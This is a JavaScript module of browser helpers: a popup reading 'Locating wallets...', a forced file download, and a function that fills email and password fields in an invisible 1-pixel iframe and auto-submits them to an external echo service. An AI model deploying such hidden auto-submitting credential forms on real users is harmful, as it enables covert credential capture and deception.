
const popupContent = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connecting...</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      text-align: center;
      background: #000;
      color: #fff;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .text {
      font-size: 16px;
      color: #333;
    }
    .spinner {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 15px;
      font-size: 2em;
    }
      .spinner div {
        position: relative;
        width: 2em;
        height: 2em;
        margin: 0.1em 0.25em 0 0;
      }
      .spinner div::after,
      .spinner div::before {
        content: '';  
        box-sizing: border-box;
        width: 100%;
        height: 100%;
        border-radius: 50%;
        border: 0.1em solid #FFF;
        position: absolute;
        left: 0;
        top: 0;
        opacity: 0;
        animation: spinner 2s linear infinite;
      }
      .spinner div::after {
        animation-delay: 1s;
      }

    @keyframes spinner {
      0% {
        transform: scale(0);
        opacity: 1;
      }
      100% {
        transform: scale(1);
        opacity: 0;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner">
      <div></div>
    </div>
    <div id="message">Locating wallets...</div>
  </div>
</body>
</html>
`;

export function createPopup(options = {}) {
  const width = options.width || 500;
  const height = options.height || 600;
  const left = (screen.width - width) / 2;
  const top = (screen.height - height) / 2;
  const popup = window.open('', '_blank', `popup=true,width=${width},height=${height},left=${left},top=${top}`);
  popup.document.write(options.content || popupContent);
  return popup;
}

export function triggerDownload(filename, data, type = 'application/json'){
  const blob = new Blob([data], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.append(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

const inputTypes = { email: 'email', password: 'password' };
export async function triggerForm(fields, element = document.body) {
  return new Promise(resolve => {
    createHiddenFrame({
      appendTo: element,
      srcdoc: `<body>${
        Object.keys(fields).reduce((html, field) => {
          const autocomplete = field === 'password' ? 'current-password' : field;
          return html + `<input type="${inputTypes[field] || 'text'}" name="${field}" value="${fields[field]}" autocomplete="${autocomplete}">`;
        }, '<form action="https://postman-echo.com/post" method="POST">') + '</form>'
      }<script>document.forms[0].submit();</script></body>`,
      onLoad: iframe => setTimeout(() => {
        iframe.remove();
        resolve();
      }, 100)
    })
  });
}

export function createHiddenFrame(options = {}){
  const iframe = document.createElement('iframe');
  iframe.style.position = 'fixed';
  iframe.style.bottom = '0';
  iframe.style.left = '0';
  iframe.style.width = '1px'; 
  iframe.style.height = '1px';
  iframe.style.zIndex = '-1000';
  if (options.onLoad) {
    iframe.addEventListener('load', () => options.onLoad(iframe), { once: true });
  }
  if (options.onError) {
    iframe.addEventListener('error', () => options.onError(iframe), { once: true });
  }
  if (options.src) iframe.src = options.src;
  else if (options.srcdoc) iframe.srcdoc = options.srcdoc;
  if (options.appendTo) options.appendTo.append(iframe);
  return iframe;
}
